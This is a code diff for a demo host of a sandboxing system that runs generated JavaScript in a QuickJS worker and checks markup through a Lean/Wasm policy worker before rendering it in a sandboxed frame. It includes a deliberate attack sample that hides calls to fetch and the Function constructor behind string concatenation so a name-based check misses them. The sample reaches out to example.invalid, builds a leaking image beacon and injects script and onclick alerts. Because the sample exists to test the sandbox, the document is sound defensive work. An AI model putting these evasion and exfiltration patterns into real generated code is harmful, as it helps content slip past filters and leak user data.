@@ -1,13 +1,58 @@
-// Demo host application. Wires together: AST gate -> QuickJS worker runtime
-// -> view string -> inert parse -> policy -> structured tree -> sandboxed frame.
+// Demo host application. Wires together: QuickJS worker runtime -> view string
+// -> POLICY WORKER (bounded parse5 preprocessing + candidate construction +
+// LEAN/WASM ACCEPTANCE) -> one-time acceptance record -> sandboxed frame.
+//
+// The render path is createGuard: it owns the frame, the policy Worker with
+// its Lean/Wasm authority, the private port that carries accepted trees from
+// that Worker to the frame, and the QuickJS Worker. This demo therefore has no
+// code path that renders a tree the JavaScript checker alone approved -- it
+// never handles a tree at all.
+//
+// Three deliberate properties of this wiring:
+//   * No parsing happens on this thread. Hostile markup costs the policy
+//     Worker time, not the host UI, and a request that exceeds its budget
+//     terminates that Worker instead of freezing the page.
+//   * Lean/Wasm is the acceptance authority and there is no fallback. If the
+//     checker does not start, every document is refused and the status says
+//     so. Rendering without it is not a degraded mode; it is a bypass.
+//   * There is no AST gate. Generated JavaScript is not statically screened;
+//     it is compiled inside QuickJS, which has no DOM, network or host
+//     objects, and its interface is checked there. A program that reaches for
+//     a host capability fails inside the sandbox, and that failure is shown.
 import manifest from "../dist/frame-manifest.js";
-import { setClassAllowlist, checkTree } from "../src/policy.js";
-import { parseHtmlToRaw } from "../src/adapters/dom.js";
 import { createSandboxFrame } from "../src/host.js";
 import { createRuntimeController } from "../src/runtime/controller.js";
-import { gateProgram } from "../src/gate.js";
+import { createPolicySession } from "../src/policy-client.js";
+import { PREPROCESS_LIMITS } from "../src/policy-protocol.js";
+import { setClassAllowlist } from "../src/policy.js";
+// The two Worker payloads, embedded as source by scripts/build.mjs. Both
+// Workers are created from blob: URLs, never from a script URL:
+//   * a cross-origin Worker URL fails on every engine under every CSP,
+//     including no CSP, so the payload has to travel with the bundle; and
+//   * a blob: Worker inherits this document's CSP, while a same-origin
+//     network Worker does not -- it would get eval, new Function and
+//     unrestricted fetch back. The demo's old `new Worker("/dist/...")` had
+//     exactly that containment hole. See docs/csp.md.
+import workerSource from "guard:worker-source";
+import policyWorkerSource from "guard:policy-worker-source";
+import { createBlobWorker } from "../src/startup.js";
+import { createGuardWith } from "../src/guard.js";
 
+// The frontend now lives in the policy Worker, but src/host.js keeps its own
+// defence-in-depth re-check of any tree handed to the frame, so the host copy
+// of the policy still needs the build's class allowlist. Removing that second
+// check is Phase 6 work, not this phase's.
 setClassAllowlist(manifest.classes);
+
+// The integrated API, assembled from source the same way src/cdn-full.js
+// assembles the shipped createGuard: same frame, same policy Worker, same
+// QuickJS Worker, all from blob: URLs.
+const createGuard = createGuardWith({
+  manifest,
+  createFrame: (options) => createSandboxFrame(options),
+  createPolicySession: (options) => createPolicySession({ ...options, createWorker: () => createBlobWorker(policyWorkerSource) }),
+  createRuntime: (options) => createRuntimeController({ ...options, createWorker: () => createBlobWorker(workerSource) }),
+});
 
 const $ = (id) => document.getElementById(id);
 const statusEl = $("status");
@@ -22,23 +67,130 @@ function report(lines) {
   reportEl.textContent = lines.join("\n");
 }
 
-let frame = null;
-let runtime = null;
+let guard = null;
+let policy = null; // probe-only: the low-level session the negative controls drive
+let probeFrame = null; // probe-only: a legacy record-path frame for the acceptance controls
 
-// View string -> validated tree, or null with reasons reported.
-function validateView(html, label, lines) {
-  const raw = parseHtmlToRaw(html, DOMParser);
-  const result = checkTree(raw);
-  if (result.status !== "validated") {
-    lines.push(`${label}: REJECTED ${JSON.stringify(result.reasons)}`);
-    return null;
-  }
-  lines.push(`${label}: validated, ${result.changes.length} change(s)`);
-  for (const c of result.changes.slice(0, 40)) lines.push("  - " + describeChange(c));
-  if (result.changes.length > 40) lines.push(`  ... ${result.changes.length - 40} more`);
-  return result.tree;
+// Startup diagnostics, kept as plain data so the browser check can read them.
+// Each entry is one stage outcome: a CSP failure in the frame produces no
+// violation report anywhere, so this list plus the per-stage codes are the
+// only account of what happened.
+const startupLog = [];
+function startupNote(text, data = null) {
+  startupLog.push(data ? `${text} ${JSON.stringify(data)}` : text);
 }
 
+// A StartupError already bounds its own fields; anything else is bounded here.
+function startupFailure(error) {
+  if (error && typeof error.toJSON === "function") return error.toJSON();
+  return { code: null, stage: null, detail: String(error && error.message).slice(0, 300) };
+}
+
+// One policy Worker per demo instance. It is recreated on demand: a
+// terminated session (timeout or worker error) is replaced with a fresh one
+// with a new session id on the next request.
+function policySession() {
+  if (!policy) {
+    policy = createPolicySession({
+      createWorker: () => createBlobWorker(policyWorkerSource),
+      classes: manifest.classes,
+      onTerminated: ({ code, detail, stage }) => {
+        if (code !== "disposed") startupNote(`probe policy worker terminated (${code}${stage ? ` at stage ${stage}` : ""})`, { detail: detail ?? null });
+      },
+    });
+    // Startup is reported per stage, not as one aggregate failure.
+    policy.whenReady().then(
+      () => { startupNote("policy worker: channel handshake complete"); },
+      (error) => { startupNote(`policy worker startup failed: ${error.code ?? error.message}`); },
+    );
+    // The wasm-init stage: the Lean authority instantiating inside the Worker.
+    // Until this resolves nothing can be accepted, and if it rejects nothing
+    // ever will be -- there is no JavaScript fallback.
+    policy.whenCheckerReady().then(
+      (checker) => { startupNote("policy worker: lean checker ready", checker); },
+      (error) => { startupNote(`lean checker startup failed: ${error.code ?? error.message}`); },
+    );
+  }
+  return policy;
+}
+
+// The whole render path is the integrated API: one object owns the frame, the
+// policy Worker with its Lean/Wasm authority, the private port between them,
+// and the QuickJS Worker. The demo never wires those together itself, and has
+// no code path that could render a tree the JavaScript checker alone approved.
+let guardReadyInfo = null;
+const guardStatus = [];
+
+async function guardInstance() {
+  if (guard) return guard;
+  guard = await createGuard({
+    container: $("frame-container"),
+    onStatus: ({ kind, detail }) => {
+      guardStatus.push({ kind, detail });
+      if (kind === "ready") { guardReadyInfo = detail.frame ?? null; startupNote("guard ready: frame, channel and Lean checker are up", detail); }
+      else if (kind === "startup-warning") startupNote(`startup warning: ${detail.code}`, detail);
+      else if (kind === "runtime-stopped") setStatus(`runtime stopped (${detail.reason?.code ?? "?"}); last validated view retained`, true);
+      else if (kind === "session-terminated") setStatus(`policy worker terminated (${detail.code ?? "?"})`, true);
+      else if (kind === "event-dropped") startupNote(`event dropped (${detail.reason?.code ?? "?"})`);
+    },
+  });
+  return guard;
+}
+
+// A new document replaces whatever is shown. With a program, its FIRST view is
+// what renders and the HTML box is not a fallback -- that is the API contract.
+async function run() {
+  const html = $("html").value;
+  const js = $("js").value.trim();
+  const lines = [];
+  let g;
+  try {
+    g = await guardInstance();
+  } catch (error) {
+    const info = startupFailure(error);
+    startupNote(`guard startup failed: ${error.code ?? error.message}`, info);
+    setStatus(`startup failed (${error.code ?? "unknown"}); nothing can render: ${error.hint ?? error.message}`, true);
+    // The hint names the directive to change; put it in the report too, since a
+    // frame/CSP failure produces no securitypolicyviolation to read otherwise.
+    report([`startup failed (${info.code ?? "unknown"} at stage ${info.stage ?? "?"}): ${info.hint ?? error.message}`]);
+    return;
+  }
+  const t0 = performance.now();
+  let result;
+  try {
+    result = js ? await g.render({ html, program: js, data: HOST_DATA }) : await g.render({ html });
+  } catch (error) {
+    // Infrastructure, not content: a StartupError from the QuickJS Worker.
+    startupNote(`quickjs worker startup failed: ${error.code ?? error.message}`, startupFailure(error));
+    setStatus(`runtime startup failed (${error.code ?? "unknown"}); nothing rendered`, true);
+    return;
+  }
+  const ms = (performance.now() - t0).toFixed(1);
+  if (result.status === "rendered") {
+    lines.push(`${js ? "interactive program" : "static document"}: accepted by Lean/Wasm and rendered in ${ms} ms`);
+    if (result.diagnostics) {
+      lines.push(`  ${result.diagnostics.total} change(s) during preprocessing`);
+      for (const c of result.diagnostics.records) lines.push("  - " + describeChange(c));
+    }
+    setStatus(js
+      ? "interactive: running in QuickJS worker, rendering in sandboxed frame"
+      : "static document rendered");
+  } else if (result.status === "superseded") {
+    lines.push("superseded by a newer document");
+  } else if (js && result.reason.code === "program-rejected") {
+    // QuickJS refused the program: it does not meet the interface or it reached
+    // for a capability that does not exist inside the sandbox. Not a CSP or
+    // startup problem, and the supplied HTML is not a fallback.
+    lines.push(`QuickJS refused the program: ${result.reason.detail ?? result.reason.code}`);
+    setStatus("interaction program failed in QuickJS; nothing rendered", true);
+  } else {
+    lines.push(`${js ? "view" : "document"} rejected: ${JSON.stringify(result.reason)} (${ms} ms)`);
+    setStatus(`${js ? "view" : "document"} rejected (${result.reason.code}); nothing rendered`, true);
+  }
+  report(lines);
+}
+
+// Compact description of one preprocessing change, for the demo report.
 function describeChange(c) {
   const where = c.path ? ` at ${c.path.join("/")}` : "";
   switch (c.kind) {
@@ -51,80 +203,6 @@ function describeChange(c) {
   }
 }
 
-async function run() {
-  const lines = [];
-  if (runtime) runtime.dispose();
-  runtime = null;
-  if (!frame) {
-    frame = createSandboxFrame({
-      container: $("frame-container"),
-      manifest,
-      onStatus: ({ kind, detail }) => {
-        if (kind === "refused") setStatus(`frame refused update: ${detail}`, true);
-      },
-      onEvent: handleEvent,
-    });
-  }
-
-  const html = $("html").value;
-  const js = $("js").value.trim();
-
-  const tree = validateView(html, "initial HTML", lines);
-  if (tree) await frame.render(tree);
-  else frame.clear();
-
-  if (!js) {
-    setStatus("static document rendered");
-    report(lines);
-    return;
-  }
-
-  const gate = gateProgram(js);
-  if (gate.status !== "eligible-for-restricted-execution") {
-    lines.push("AST gate: REJECTED (returned for regeneration)");
-    for (const r of gate.reasons) lines.push(`  - ${r.code}${r.line ? ` @${r.line}:${r.column}` : ""} ${r.message ?? r.name ?? ""}`);
-    setStatus("interaction source rejected by AST gate; static document kept", true);
-    report(lines);
-    return;
-  }
-  lines.push("AST gate: eligible for restricted execution");
-
-  runtime = createRuntimeController({
-    createWorker: () => new Worker("/dist/worker.js"),
-    onDead: (reason) => { if (reason !== "disposed") setStatus(`runtime stopped: ${reason}. Last validated view retained.`, true); },
-  });
-  try {
-    const t0 = performance.now();
-    const { view } = await runtime.load(gate.program.source, HOST_DATA);
-    lines.push(`runtime: loaded and initialized in ${(performance.now() - t0).toFixed(1)} ms`);
-    const viewTree = validateView(view, "initial view", lines);
-    if (viewTree) {
-      await frame.render(viewTree);
-      setStatus("interactive: running in QuickJS worker, rendering in sandboxed frame");
-    } else {
-      setStatus("initial view rejected; static document kept", true);
-    }
-  } catch (err) {
-    lines.push(`runtime error: ${err.message}`);
-  }
-  report(lines);
-}
-
-let eventCount = 0;
-async function handleEvent(ev) {
-  if (!runtime || runtime.dead) return;
-  eventCount++;
-  try {
-    const t0 = performance.now();
-    const { view } = await runtime.step(ev);
-    const lines = [`event #${eventCount}: ${JSON.stringify(ev)} -> ${(performance.now() - t0).toFixed(1)} ms in runtime`];
-    const tree = validateView(view, "view", lines);
-    if (tree) await frame.render(tree);
-    report(lines);
-  } catch (err) {
-    if (err.message !== "event queue full") report([`event failed: ${err.message}`]);
-  }
-}
 
 // ---------------------------------------------------------------------------
 // Samples
@@ -235,15 +313,40 @@ const ATTACK_HTML = `<div class="card" id="root" style="position:fixed;top:0;lef
   <input type="text" accesskey="x" autofocus tabindex="5" contenteditable>
 </div>`;
 
-const ATTACK_JS = `const initialState = { n: 0 };
+// No static denylist screens this program. Every lookup below is written with
+// computed access precisely so that a name-based check would miss it; they
+// fail because the capabilities do not exist inside QuickJS. The first one
+// throws while the program is being initialized, so the static document stays
+// on screen with the failure reported.
+const ATTACK_JS = `const host = globalThis;
+const reach = (name) => host[name];
+const initialState = { n: 0, leak: reach("fe" + "tch")("https://example.invalid/x") };
 function update(state, event) {
-  // Each of these is either unavailable in QuickJS or rejected by the AST gate.
-  fetch("https://example.invalid/x");
+  const dyn = reach("Func" + "tion");
+  if (dyn) new dyn("return this")().fetch("https://example.invalid/y");
   return { n: state.n + 1 };
 }
 function view(state) {
   return '<img src="https://example.invalid/leak?' + state.n + '"><script>alert(1)</script><p onclick="alert(2)">n=' + state.n + '</p>';
 }`;
+
+let probeRuntime = null;
+async function bootProbe() {
+  // Starting the probe policy session creates its blob: Worker, which resolves
+  // whenReady() -> "policy worker: channel handshake complete" and
+  // whenCheckerReady() -> "policy worker: lean checker ready".
+  policySession().start().catch((error) => startupNote(`probe policy start failed: ${error.code ?? error.message}`));
+  // A probe QuickJS Worker, loaded with a trivial program, so the wasm-init
+  // stage inside a blob: Worker is observed too.
+  try {
+    probeRuntime = createRuntimeController({ createWorker: () => createBlobWorker(workerSource) });
+    await probeRuntime.load("var initialState={};function update(s){return s}function view(){return ''}");
+    startupNote("quickjs worker: wasm-init stage complete");
+  } catch (error) {
+    startupNote(`probe quickjs start failed: ${error.code ?? error.message}`);
+  }
+}
+bootProbe();
 
 $("benign").addEventListener("click", () => { $("html").value = BENIGN_HTML; $("js").value = BENIGN_JS; run(); });
 $("attack").addEventListener("click", () => { $("html").value = ATTACK_HTML; $("js").value = ATTACK_JS; run(); });
@@ -251,3 +354,163 @@ $("run").addEventListener("click", run);
 $("html").value = BENIGN_HTML;
 $("js").value = BENIGN_JS;
 run();
+
+// ---------------------------------------------------------------------------
+// Host-side probe used by scripts/browser-check.mjs. It only calls the same
+// public policy-session API the demo uses; it cannot render anything and it
+// grants no capability to generated content.
+window.__guardPolicyProbe = {
+  stats: () => policySession().stats,
+  // The shipped preprocessing limits, so the browser check asserts against the
+  // build rather than against a number copied into the checker script.
+  limits: () => ({ ...PREPROCESS_LIMITS }),
+  // Per-stage startup outcomes. Read by scripts/browser-check.mjs, including
+  // under a deliberately broken host CSP (serve.mjs ?cspOmit=...), which is
+  // the only way to demonstrate that the codes are actually reachable.
+  startupLog: () => startupLog.slice(),
+  async policyReady() {
+    try {
+      await policySession().whenReady();
+      return { ok: true };
+    } catch (error) {
+      return { ok: false, ...startupFailure(error) };
+    }
+  },
+  // The wasm-init stage for the Lean authority, and what it reports about
+  // itself. `checker` is bounded plain data from the Worker.
+  async checkerReady() {
+    try {
+      const checker = await policySession().whenCheckerReady();
+      return { ok: true, checker };
+    } catch (error) {
+      return { ok: false, ...startupFailure(error) };
+    }
+  },
+  // NEGATIVE CONTROL, in the browser, on the shipped bytes: a fabricated
+  // acceptance record and a replayed one must both fail to render. Neither
+  // touches the policy Worker; both are refused by the frame's render path.
+  async acceptanceControls() {
+    const result = await policySession().preprocess('<p class="card">control</p>');
+    if (result.status !== "accepted") return { accepted: false, reason: result.reason ?? null };
+    // A dedicated record-path frame, off-screen, so this control is separate
+    // from the guard's own frame (which is port-bound and takes no records).
+    if (!probeFrame) {
+      const box = document.createElement("div");
+      box.style.display = "none";
+      document.body.appendChild(box);
+      probeFrame = createSandboxFrame({ container: box, manifest, claimAcceptance: (token) => policySession().claimAcceptance(token) });
+    }
+    const forged = { ...result.acceptance, nonce: "0".repeat(result.acceptance.nonce.length) };
+    const forgedRendered = await probeFrame.render(forged);
+    const bareTreeRendered = await probeFrame.render(result.tree);
+    // The one-time property is checked through the session, so this control
+    // does not replace the document the rest of the page is asserting about.
+    const genuine = policySession().claimAcceptance(result.acceptance).ok;
+    const replayed = policySession().claimAcceptance(result.acceptance).ok;
+    return {
+      accepted: true,
+      authority: result.authority,
+      checkerVersion: result.stats.checkerVersion,
+      forgedRendered,
+      bareTreeRendered,
+      genuine,
+      replayed,
+    };
+  },
+  async frameReady() {
+    try {
+      await guardInstance();
+      return { ok: true, info: guardReadyInfo };
+    } catch (error) {
+      return { ok: false, ...startupFailure(error) };
+    }
+  },
+  // Bounded rejection of hostile markup, with the host thread free.
+  async preprocess(html, options) {
+    const t0 = performance.now();
+    const result = await policySession().preprocess(html, options);
+    return { status: result.status, reason: result.reason ?? null, ms: performance.now() - t0 };
+  },
+  // A request budget small enough that the Worker cannot answer in time:
+  // the client must terminate it and settle the request.
+  async forceTimeout(html) {
+    const session = policySession();
+    const before = session.sessionId;
+    const result = await session.preprocess(html, { timeoutMs: 1 });
+    return {
+      status: result.status,
+      code: result.reason?.code ?? null,
+      terminated: session.alive === false,
+      sessionChanged: session.sessionId !== before,
+      pending: session.pendingCount,
+    };
+  },
+  // Wasm and string-evaluation probe, in the host realm and inside a blob:
+  // Worker (which inherits this document's CSP). This is how the browser
+  // check measures, rather than quotes, two claims: that 'wasm-unsafe-eval'
+  // is what Wasm needs, and that it does NOT re-enable eval or new Function.
+  // The module is the 8-byte empty module; nothing is executed.
+  async wasmProbe() {
+    const bytes = new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
+    const tryIt = (fn) => { try { return fn(); } catch (error) { return `refused:${error.name}: ${String(error.message).slice(0, 160)}`; } };
+    const tryAsync = async (fn) => { try { return await fn(); } catch (error) { return `refused:${error.name}: ${String(error.message).slice(0, 160)}`; } };
+    // The synchronous constructor and the async forms are probed separately:
+    // they are not enforced identically on every engine, and the production
+    // QuickJS path uses the async one.
+    const host = {
+      sync: tryIt(() => { new WebAssembly.Module(bytes); return "ok"; }),
+      async: await tryAsync(async () => { await WebAssembly.compile(bytes); return "ok"; }),
+      instantiate: await tryAsync(async () => { await WebAssembly.instantiate(bytes); return "ok"; }),
+    };
+    const source = "self.onmessage=function(){"
+      + "var b=new Uint8Array([0,97,115,109,1,0,0,0]);"
+      + "function t(f){try{return f()}catch(e){return 'refused:'+e.name+': '+String(e.message).slice(0,160)}}"
+      + "function ta(f){return Promise.resolve().then(f).then(function(v){return v}).catch(function(e){return 'refused:'+e.name+': '+String(e.message).slice(0,160)})}"
+      + "Promise.all([ta(function(){return WebAssembly.compile(b).then(function(){return 'ok'})}),"
+      + "ta(function(){return WebAssembly.instantiate(b).then(function(){return 'ok'})})])"
+      + ".then(function(r){self.postMessage({"
+      + "wasmSync:t(function(){new WebAssembly.Module(b);return 'ok'}),"
+      + "wasmAsync:r[0],wasmInstantiate:r[1],"
+      + "eval:t(function(){return String(eval('1+1'))}),"
+      + "newFunction:t(function(){return String(new Function('return 2')())})"
+      + "})})};";
+    let worker;
+    try {
+      worker = createBlobWorker(source);
+    } catch (error) {
+      return { host, blobWorker: { created: false, ...startupFailure(error) } };
+    }
+    const inWorker = await new Promise((resolve) => {
+      const timer = setTimeout(() => resolve({ timedOut: true }), 10_000);
+      worker.addEventListener("message", (event) => { clearTimeout(timer); resolve(event.data); });
+      worker.addEventListener("error", () => { clearTimeout(timer); resolve({ workerError: true }); });
+      worker.postMessage("go");
+    });
+    worker.terminate();
+    return { host, blobWorker: { created: true, ...inWorker } };
+  },
+  // The sibling bound, measured in this engine rather than quoted from the
+  // Node audit. The Lean checker recurses once per sibling and that recursion
+  // lives on the engine's own call stack, which no build flag configures, so
+  // `maxRawNodes` is what keeps it inside. At the bound the result must be
+  // STRUCTURED -- accepted or rejected -- and the Worker must still be alive;
+  // one node past it, preprocessing must refuse. A crash would show up as a
+  // terminated session instead.
+  async siblingBound(atLimit, pastLimit) {
+    const session = policySession();
+    const at = await session.preprocess("<p></p>".repeat(atLimit));
+    const aliveAfterLimit = session.alive;
+    const past = await session.preprocess("<p></p>".repeat(pastLimit));
+    return {
+      at: { status: at.status, code: at.reason?.code ?? null, authority: at.authority ?? null },
+      aliveAfterLimit,
+      past: { status: past.status, code: past.reason?.code ?? null, limit: past.reason?.limit ?? null },
+      aliveAtEnd: session.alive,
+    };
+  },
+  // After a termination the next request must work again on a fresh Worker.
+  async recover() {
+    const result = await policySession().preprocess('<p class="muted">recovered</p>');
+    return { status: result.status, sessionId: policySession().sessionId };
+  },
+};
